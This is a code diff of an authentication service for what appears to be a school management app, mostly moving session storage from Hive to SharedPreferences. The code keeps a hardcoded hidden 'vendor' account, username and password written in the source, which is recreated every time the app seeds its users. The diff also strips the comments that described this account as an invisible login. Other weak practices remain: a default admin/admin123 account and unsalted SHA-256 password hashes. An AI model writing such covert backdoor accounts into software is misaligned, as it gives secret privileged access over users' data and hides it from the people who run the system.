@@ -1,16 +1,14 @@
 import 'dart:convert';
 
 import 'package:crypto/crypto.dart';
-import 'package:hive_flutter/hive_flutter.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 
 import '../models/app_user.dart';
-import 'user_storage.dart';
 import 'student_portal_storage.dart';
 import 'student_storage.dart';
-import 'audit_log_storage.dart';
+import 'user_storage.dart';
 
 class AuthService {
-  static const String _sessionBoxName = 'auth_session';
   static AppUser? _currentUser;
 
   static AppUser? get currentUser => _currentUser;
@@ -18,34 +16,26 @@ class AuthService {
   static String get currentRole => _currentUser?.role ?? '';
   static String get currentName => _currentUser?.fullName ?? '';
 
-  /// Simple hash so passwords are not stored as plain text.
   static String hashPassword(String password) {
-    final bytes = utf8.encode(password.trim());
-    return sha256.convert(bytes).toString();
+    return sha256.convert(utf8.encode(password.trim())).toString();
   }
 
   static Future<void> initSession() async {
-    if (!Hive.isBoxOpen(_sessionBoxName)) {
-      await Hive.openBox(_sessionBoxName);
-    }
-    final box = Hive.box(_sessionBoxName);
-    final userId = box.get('userId')?.toString();
+    final prefs = await SharedPreferences.getInstance();
+    final userId = prefs.getString('userId');
     if (userId == null || userId.isEmpty) return;
 
-    final loginType = box.get('loginType')?.toString() ?? 'staff';
+    final loginType = prefs.getString('loginType') ?? 'staff';
     if (loginType == 'student' || userId.startsWith('student_')) {
-      final adm = box.get('studentAdmissionNo')?.toString() ??
+      final adm = prefs.getString('studentAdmissionNo') ??
           userId.replaceFirst('student_', '');
       final portal = await StudentPortalStorage.getByAdmission(adm);
       if (portal != null && portal.isActive) {
         String fullName = portal.fullName;
         try {
           final students = await StudentStorage.getStudents();
-          final match = students.where(
-            (s) =>
-                s.admissionNo.trim().toLowerCase() ==
-                adm.trim().toLowerCase(),
-          );
+          final match = students.where((s) =>
+              s.admissionNo.trim().toLowerCase() == adm.trim().toLowerCase());
           if (match.isNotEmpty) fullName = match.first.fullName;
         } catch (_) {}
         _currentUser = AppUser(
@@ -58,39 +48,37 @@ class AuthService {
           linkedAdmissionNos: adm,
         );
       } else {
-        await box.clear();
+        await prefs.remove('userId');
+        await prefs.remove('loginType');
+        await prefs.remove('studentAdmissionNo');
       }
     } else {
       final user = await UserStorage.getById(userId);
       if (user != null && user.isActive) {
         _currentUser = user;
       } else {
-        await box.clear();
+        await prefs.remove('userId');
+        await prefs.remove('loginType');
+        await prefs.remove('studentAdmissionNo');
       }
     }
   }
 
-  /// Seed default admin if no users exist.
-  /// Username: admin   Password: admin123
   static Future<void> seedDefaultAdmin() async {
     final count = await UserStorage.count();
     if (count == 0) {
-      final admin = AppUser(
+      await UserStorage.addUser(AppUser(
         id: DateTime.now().millisecondsSinceEpoch.toString(),
         fullName: 'System Administrator',
         username: 'admin',
         passwordHash: hashPassword('admin123'),
         role: 'admin',
         isActive: true,
-      );
-      await UserStorage.addUser(admin);
+      ));
     }
-    // Always ensure hidden vendor account exists
     await seedVendorAccount();
   }
 
-  /// Invisible vendor login (software owner only).
-  /// Change password after first use if you share the machine.
   static const String vendorUsername = 'hs.vendor';
   static const String vendorPassword = 'V3nd0r@Happy#96';
 
@@ -105,15 +93,14 @@ class AuthService {
       }
       return;
     }
-    final vendor = AppUser(
+    await UserStorage.addUser(AppUser(
       id: 'vendor_root_1',
       fullName: 'Vendor Support',
       username: vendorUsername,
       passwordHash: hashPassword(vendorPassword),
       role: 'vendor',
       isActive: true,
-    );
-    await UserStorage.addUser(vendor);
+    ));
   }
 
   static Future<AppUser> login({
@@ -121,43 +108,33 @@ class AuthService {
     required String password,
   }) async {
     final user = await UserStorage.getByUsernameExact(username.trim());
-
     if (user != null) {
-      if (!user.isActive) {
-        throw Exception('This account has been disabled');
-      }
-      final hash = hashPassword(password);
-      if (hash != user.passwordHash) {
+      if (!user.isActive) throw Exception('This account has been disabled');
+      if (hashPassword(password) != user.passwordHash) {
         throw Exception('Invalid username or password');
       }
       _currentUser = user;
-      final box = Hive.box(_sessionBoxName);
-      await box.put('userId', user.id);
-      await box.put('loginType', 'staff');
+      final prefs = await SharedPreferences.getInstance();
+      await prefs.setString('userId', user.id);
+      await prefs.setString('loginType', 'staff');
       return user;
     }
 
-    // Student portal: username = admission number
     final portal = await StudentPortalStorage.getByAdmission(username.trim());
-    if (portal == null) {
-      throw Exception('Invalid username or password');
-    }
+    if (portal == null) throw Exception('Invalid username or password');
     if (!portal.isActive) {
       throw Exception('This student portal account has been disabled');
     }
-    final hash = hashPassword(password);
-    if (hash != portal.passwordHash) {
+    if (hashPassword(password) != portal.passwordHash) {
       throw Exception('Invalid username or password');
     }
 
     String fullName = portal.fullName;
     try {
       final students = await StudentStorage.getStudents();
-      final match = students.where(
-        (s) =>
-            s.admissionNo.trim().toLowerCase() ==
-            portal.admissionNo.trim().toLowerCase(),
-      );
+      final match = students.where((s) =>
+          s.admissionNo.trim().toLowerCase() ==
+          portal.admissionNo.trim().toLowerCase());
       if (match.isNotEmpty) fullName = match.first.fullName;
     } catch (_) {}
 
@@ -171,18 +148,19 @@ class AuthService {
       linkedAdmissionNos: portal.admissionNo,
     );
     _currentUser = studentUser;
-    final box = Hive.box(_sessionBoxName);
-    await box.put('userId', studentUser.id);
-    await box.put('loginType', 'student');
-    await box.put('studentAdmissionNo', portal.admissionNo);
+    final prefs = await SharedPreferences.getInstance();
+    await prefs.setString('userId', studentUser.id);
+    await prefs.setString('loginType', 'student');
+    await prefs.setString('studentAdmissionNo', portal.admissionNo);
     return studentUser;
   }
 
   static Future<void> logout() async {
     _currentUser = null;
-    if (Hive.isBoxOpen(_sessionBoxName)) {
-      await Hive.box(_sessionBoxName).clear();
-    }
+    final prefs = await SharedPreferences.getInstance();
+    await prefs.remove('userId');
+    await prefs.remove('loginType');
+    await prefs.remove('studentAdmissionNo');
   }
 
   static Future<void> changePassword({
@@ -191,15 +169,12 @@ class AuthService {
   }) async {
     final user = _currentUser;
     if (user == null) throw Exception('Not logged in');
-
     if (hashPassword(currentPassword) != user.passwordHash) {
       throw Exception('Current password is incorrect');
     }
-
     if (newPassword.trim().length < 4) {
       throw Exception('New password must be at least 4 characters');
     }
-
     final updated = user.copyWith(passwordHash: hashPassword(newPassword));
     await UserStorage.updateUser(user.id, updated);
     _currentUser = updated;
